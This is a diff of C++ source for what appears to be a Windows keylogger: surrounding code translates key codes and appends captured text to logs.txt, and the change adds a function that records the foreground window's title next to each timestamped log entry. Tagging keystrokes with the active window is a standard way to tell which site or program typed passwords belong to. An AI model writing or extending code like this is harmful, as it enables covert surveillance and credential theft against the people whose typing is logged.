@@ -42,19 +42,28 @@ std::string translateKeys(int key){
 	return result;
 }
 
-std::string writeDate() {
+std::string getDate() {
 	struct tm* timeinfo;
-	char timeArr[21];
-	std::string timeStr;
+	char timestr[21];
+	//std::string timeStr;
 	time_t rawtime;
 
 	time(&rawtime);
 	std::cout << time(NULL) << std::endl;
 	timeinfo = localtime(&rawtime);
 	std::cout << timeinfo->tm_mday << std::endl;
-	sprintf(timeArr, "[%02d-%02d-%d %02d:%02d:%02d]", timeinfo->tm_mday, timeinfo->tm_mon + 1, timeinfo->tm_year + 1900, timeinfo->tm_hour, timeinfo->tm_min, timeinfo->tm_sec);
-	timeStr = timeArr;
-	return (timeStr);
+	sprintf(timestr, "[%02d-%02d-%d %02d:%02d:%02d]", timeinfo->tm_mday, timeinfo->tm_mon + 1, timeinfo->tm_year + 1900, timeinfo->tm_hour, timeinfo->tm_min, timeinfo->tm_sec);
+	//timeStr = timeArr;
+	return (timestr);
+}
+
+std::string getForegroundProcess(){
+	HWND fgw = GetForegroundWindow();
+	char windowtitle[256];
+
+	GetWindowText(fgw, windowtitle, sizeof(windowtitle));
+	std::cout << "{{" << fgw << "}}";
+	return windowtitle;
 }
 
 void writeLogs(std::string buf) {
@@ -62,8 +71,10 @@ void writeLogs(std::string buf) {
 
 	logfile.open("logs.txt", std::ios::app);
 	std::cout << "||||WRITING TO FILE||||";
-	logfile << writeDate();
-	logfile << " - ";
+	logfile << getDate();
+	logfile << " - '";
+	logfile << getForegroundProcess();
+	logfile << "' - ";
 	logfile << buf << std::endl;
 	logfile.close();
 }
